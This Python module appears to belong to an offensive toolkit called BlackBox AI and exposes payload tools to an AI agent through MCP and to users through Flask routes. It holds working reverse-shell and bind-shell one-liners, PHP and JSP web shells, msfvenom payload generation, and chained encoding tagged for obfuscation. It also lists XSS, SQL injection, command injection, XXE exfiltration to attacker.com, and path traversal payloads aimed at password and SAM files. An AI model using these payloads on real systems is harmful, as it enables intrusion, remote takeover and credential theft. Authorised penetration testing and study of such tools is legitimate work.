#!/usr/bin/env python3
"""
BlackBox AI - Payloads Module
==============================

Payload generation and encoding tools:
- msfvenom (Metasploit payload generator)
- PayloadsAllTheThings reference
- Custom encoder/decoder
- Shellcode utilities
"""

import sys
import os
from pathlib import Path

module_dir = Path(__file__).parent.parent.parent
if str(module_dir) not in sys.path:
    sys.path.insert(0, str(module_dir))

from modules.base import BaseModule, ModuleCategory, ModuleStatus, ToolDefinition, RouteDefinition, ToolWrapper, ToolResult
from modules.cli import CLIToolWrapper
from typing import Dict, Any, List, Optional
import logging
import json
import base64
import re

logger = logging.getLogger(__name__)


class MsfvenomWrapper(CLIToolWrapper):
    """Wrapper for Metasploit msfvenom payload generator"""
    name = "msfvenom"
    description = "Metasploit payload generator and encoder"

    def build_command(self, payload: str, lhost: str = "", lport: int = 4444,
                     format_type: str = "raw", encoder: str = "",
                     iterations: int = 1, bad_chars: str = "",
                     **kwargs) -> List[str]:
        command = [self.tool_path, "-p", payload]

        if lhost:
            command.append(f"LHOST={lhost}")
        if lport:
            command.append(f"LPORT={lport}")
        if format_type:
            command.extend(["-f", format_type])
        if encoder:
            command.extend(["-e", encoder])
            if iterations > 1:
                command.extend(["-i", str(iterations)])
        if bad_chars:
            command.extend(["-b", bad_chars])

        return command

    def parse_output(self, stdout: str, stderr: str, return_code: int) -> Dict[str, Any]:
        return {
            "payload": stdout,
            "size": len(stdout),
            "success": return_code == 0,
            "errors": stderr if return_code != 0 else ""
        }


class PayloadEncoder:
    """Custom payload encoding utilities"""

    ENCODINGS = ["base64", "hex", "url", "unicode", "html", "rot13"]

    @staticmethod
    def encode(data: str, encoding: str) -> str:
        """Encode data using specified encoding"""
        if encoding == "base64":
            return base64.b64encode(data.encode()).decode()
        elif encoding == "hex":
            return data.encode().hex()
        elif encoding == "url":
            from urllib.parse import quote
            return quote(data)
        elif encoding == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in data)
        elif encoding == "html":
            return ''.join(f'&#{ord(c)};' for c in data)
        elif encoding == "rot13":
            import codecs
            return codecs.encode(data, 'rot_13')
        return data

    @staticmethod
    def decode(data: str, encoding: str) -> str:
        """Decode data using specified encoding"""
        if encoding == "base64":
            return base64.b64decode(data).decode()
        elif encoding == "hex":
            return bytes.fromhex(data).decode()
        elif encoding == "url":
            from urllib.parse import unquote
            return unquote(data)
        elif encoding == "rot13":
            import codecs
            return codecs.decode(data, 'rot_13')
        return data

    @staticmethod
    def chain_encode(data: str, encodings: List[str]) -> Dict[str, Any]:
        """Apply multiple encodings in sequence"""
        result = data
        steps = [{"encoding": "raw", "output": data}]

        for enc in encodings:
            result = PayloadEncoder.encode(result, enc)
            steps.append({"encoding": enc, "output": result})

        return {
            "original": data,
            "final": result,
            "steps": steps,
            "encodings": encodings
        }


class ShellcodeGenerator:
    """Generate common shellcode patterns"""

    # Common shellcode templates (educational)
    TEMPLATES = {
        "reverse_shell_bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "reverse_shell_python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "reverse_shell_nc": "nc -e /bin/sh {lhost} {lport}",
        "reverse_shell_perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "reverse_shell_php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "reverse_shell_ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "bind_shell_nc": "nc -lvnp {lport} -e /bin/sh",
        "web_shell_php": "<?php system($_GET['cmd']); ?>",
        "web_shell_jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    }

    @classmethod
    def generate(cls, template: str, lhost: str = "", lport: int = 4444) -> Dict[str, Any]:
        """Generate shellcode from template"""
        if template not in cls.TEMPLATES:
            return {"error": f"Unknown template: {template}",
                   "available": list(cls.TEMPLATES.keys())}

        code = cls.TEMPLATES[template].format(lhost=lhost, lport=lport)

        return {
            "template": template,
            "code": code,
            "lhost": lhost,
            "lport": lport,
            "length": len(code),
            "encodings": {
                "base64": base64.b64encode(code.encode()).decode(),
                "url": code.replace(" ", "%20").replace("'", "%27")
            }
        }

    @classmethod
    def list_templates(cls) -> Dict[str, str]:
        """List available templates"""
        return {name: tpl[:50] + "..." if len(tpl) > 50 else tpl
                for name, tpl in cls.TEMPLATES.items()}


class PayloadsAllTheThings:
    """Reference to PayloadsAllTheThings repository patterns"""

    # Common payload categories with examples
    CATEGORIES = {
        "xss": {
            "basic": "<script>alert(1)</script>",
            "img": "<img src=x onerror=alert(1)>",
            "svg": "<svg onload=alert(1)>",
            "body": "<body onload=alert(1)>",
            "event": "' onfocus=alert(1) autofocus='",
            "polyglot": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
        },
        "sqli": {
            "basic": "' OR '1'='1",
            "union": "' UNION SELECT NULL,NULL,NULL--",
            "time_blind": "' AND SLEEP(5)--",
            "error": "' AND 1=CONVERT(int,(SELECT @@version))--",
            "stacked": "'; DROP TABLE users;--"
        },
        "ssti": {
            "jinja2": "{{7*7}}",
            "twig": "{{7*7}}",
            "freemarker": "${7*7}",
            "velocity": "#set($x=7*7)$x",
            "smarty": "{$smarty.version}",
            "mako": "${7*7}"
        },
        "command_injection": {
            "basic": "; id",
            "pipe": "| id",
            "backtick": "`id`",
            "dollar": "$(id)",
            "newline": "%0aid",
            "semicolon_bypass": ";%00id"
        },
        "xxe": {
            "basic": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "blind": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
            "parameter": "<!DOCTYPE foo [<!ENTITY % data SYSTEM \"file:///etc/passwd\"><!ENTITY % param1 \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%data;'>\">%param1;%exfil;]>"
        },
        "path_traversal": {
            "basic": "../../../etc/passwd",
            "encoded": "..%2f..%2f..%2fetc%2fpasswd",
            "double_encoded": "..%252f..%252f..%252fetc%252fpasswd",
            "null_byte": "../../../etc/passwd%00.jpg",
            "windows": "..\\..\\..\\windows\\system32\\config\\sam"
        }
    }

    @classmethod
    def get_payloads(cls, category: str) -> Dict[str, str]:
        """Get payloads for a category"""
        return cls.CATEGORIES.get(category, {})

    @classmethod
    def search(cls, keyword: str) -> Dict[str, Dict[str, str]]:
        """Search payloads by keyword"""
        results = {}
        for cat, payloads in cls.CATEGORIES.items():
            matches = {name: payload for name, payload in payloads.items()
                      if keyword.lower() in payload.lower() or keyword.lower() in name.lower()}
            if matches:
                results[cat] = matches
        return results

    @classmethod
    def list_categories(cls) -> List[str]:
        """List available categories"""
        return list(cls.CATEGORIES.keys())


class PayloadsModule(BaseModule):
    """
    Payloads Module for BlackBox.

    Provides payload generation, encoding, and reference capabilities.
    """

    name = "payloads"
    version = "1.0.0"
    category = ModuleCategory.PAYLOADS
    description = "Payload generation, encoding, and reference tools"
    author = "BlackBox Team"
    tags = ["payloads", "shellcode", "encoding", "msfvenom"]

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)

        self.msfvenom = MsfvenomWrapper()
        self.encoder = PayloadEncoder()
        self.shellcode = ShellcodeGenerator()
        self.payloads_ref = PayloadsAllTheThings()

    def on_load(self) -> bool:
        self.logger.info(f"Loading {self.name} module v{self.version}")

        tools = {
            "msfvenom": self.msfvenom.is_available(),
            "encoder": True,  # Built-in
            "shellcode_generator": True,  # Built-in
            "payloads_reference": True  # Built-in
        }

        available = sum(tools.values())
        self.logger.info(f"Payload tools available: {available}/{len(tools)}")
        return True

    def register_tools(self, mcp: Any, client: Any) -> List[ToolDefinition]:
        tools = []

        @mcp.tool()
        def payload_msfvenom(payload: str, lhost: str = "", lport: int = 4444,
                            format_type: str = "raw", encoder: str = "",
                            timeout: int = 60) -> Dict[str, Any]:
            """
            Generate payload using msfvenom.

            Args:
                payload: Payload type (e.g., linux/x64/shell_reverse_tcp)
                lhost: Local host for reverse connections
                lport: Local port
                format_type: Output format (raw, python, c, exe, etc.)
                encoder: Encoder to use
                timeout: Execution timeout

            Returns:
                Generated payload
            """
            self.logger.info(f"Generating payload: {payload}")
            result = self.msfvenom.execute(
                payload=payload, lhost=lhost, lport=lport,
                format_type=format_type, encoder=encoder, timeout=timeout
            )
            return result.to_dict()

        tools.append(ToolDefinition(
            name="payload_msfvenom",
            description="Generate payload with msfvenom",
            handler=payload_msfvenom,
            category="payloads",
            tags=["msfvenom", "metasploit", "generation"]
        ))

        @mcp.tool()
        def payload_encode(data: str, encodings: List[str]) -> Dict[str, Any]:
            """
            Encode data using multiple encodings.

            Args:
                data: Data to encode
                encodings: List of encodings to apply (base64, hex, url, unicode, html, rot13)

            Returns:
                Encoded data with all steps
            """
            return self.encoder.chain_encode(data, encodings)

        tools.append(ToolDefinition(
            name="payload_encode",
            description="Encode payload with multiple encodings",
            handler=payload_encode,
            category="payloads",
            tags=["encode", "obfuscate"]
        ))

        @mcp.tool()
        def payload_decode(data: str, encoding: str) -> Dict[str, Any]:
            """
            Decode encoded data.

            Args:
                data: Encoded data
                encoding: Encoding type

            Returns:
                Decoded data
            """
            try:
                decoded = self.encoder.decode(data, encoding)
                return {"original": data, "decoded": decoded, "encoding": encoding}
            except Exception as e:
                return {"error": str(e), "original": data}

        tools.append(ToolDefinition(
            name="payload_decode",
            description="Decode encoded payload",
            handler=payload_decode,
            category="payloads",
            tags=["decode"]
        ))

        @mcp.tool()
        def payload_shellcode(template: str, lhost: str = "",
                             lport: int = 4444) -> Dict[str, Any]:
            """
            Generate shellcode from templates.

            Args:
                template: Template name (reverse_shell_bash, reverse_shell_python, etc.)
                lhost: Target host
                lport: Target port

            Returns:
                Generated shellcode with encodings
            """
            return self.shellcode.generate(template, lhost, lport)

        tools.append(ToolDefinition(
            name="payload_shellcode",
            description="Generate shellcode from templates",
            handler=payload_shellcode,
            category="payloads",
            tags=["shellcode", "reverse_shell"]
        ))

        @mcp.tool()
        def payload_list_templates() -> Dict[str, Any]:
            """
            List available shellcode templates.

            Returns:
                Available templates
            """
            return {
                "templates": self.shellcode.list_templates(),
                "encodings": self.encoder.ENCODINGS
            }

        tools.append(ToolDefinition(
            name="payload_list_templates",
            description="List shellcode templates",
            handler=payload_list_templates,
            category="payloads",
            tags=["list", "reference"]
        ))

        @mcp.tool()
        def payload_reference(category: str = "") -> Dict[str, Any]:
            """
            Get payload references from PayloadsAllTheThings.

            Args:
                category: Category (xss, sqli, ssti, command_injection, xxe, path_traversal)

            Returns:
                Payload examples for category
            """
            if category:
                return {
                    "category": category,
                    "payloads": self.payloads_ref.get_payloads(category)
                }
            return {
                "categories": self.payloads_ref.list_categories(),
                "description": "Use category parameter to get specific payloads"
            }

        tools.append(ToolDefinition(
            name="payload_reference",
            description="Get payload references",
            handler=payload_reference,
            category="payloads",
            tags=["reference", "payloads"]
        ))

        @mcp.tool()
        def payload_search(keyword: str) -> Dict[str, Any]:
            """
            Search payloads by keyword.

            Args:
                keyword: Search keyword

            Returns:
                Matching payloads
            """
            return {
                "keyword": keyword,
                "results": self.payloads_ref.search(keyword)
            }

        tools.append(ToolDefinition(
            name="payload_search",
            description="Search payload database",
            handler=payload_search,
            category="payloads",
            tags=["search", "reference"]
        ))

        self._tools = tools
        return tools

    def register_routes(self, app: Any) -> List[RouteDefinition]:
        from flask import request, jsonify
        routes = []

        @app.route('/api/payloads/encode', methods=['POST'])
        def api_payload_encode():
            data = request.get_json() or {}
            payload = data.get('data', '')
            encodings = data.get('encodings', ['base64'])
            return jsonify(self.encoder.chain_encode(payload, encodings))

        routes.append(RouteDefinition(path="/api/payloads/encode", methods=["POST"],
                                     handler=api_payload_encode, description="Encode payload"))

        @app.route('/api/payloads/shellcode', methods=['POST'])
        def api_payload_shellcode():
            data = request.get_json() or {}
            template = data.get('template', 'reverse_shell_bash')
            lhost = data.get('lhost', '')
            lport = data.get('lport', 4444)
            return jsonify(self.shellcode.generate(template, lhost, lport))

        routes.append(RouteDefinition(path="/api/payloads/shellcode", methods=["POST"],
                                     handler=api_payload_shellcode, description="Generate shellcode"))

        @app.route('/api/payloads/reference/<category>', methods=['GET'])
        def api_payload_reference(category):
            return jsonify(self.payloads_ref.get_payloads(category))

        routes.append(RouteDefinition(path="/api/payloads/reference/<category>", methods=["GET"],
                                     handler=api_payload_reference, description="Get payload reference"))

        @app.route('/api/payloads/status', methods=['GET'])
        def api_payloads_status():
            return jsonify(self.health_check())

        routes.append(RouteDefinition(path="/api/payloads/status", methods=["GET"],
                                     handler=api_payloads_status, description="Module status"))

        self._routes = routes
        return routes

    def health_check(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "version": self.version,
            "status": self.status.value,
            "healthy": True,  # Built-in tools always available
            "tools": {
                "msfvenom": self.msfvenom.is_available(),
                "encoder": True,
                "shellcode_generator": True,
                "payloads_reference": True
            },
            "payload_categories": self.payloads_ref.list_categories()
        }


Module = PayloadsModule
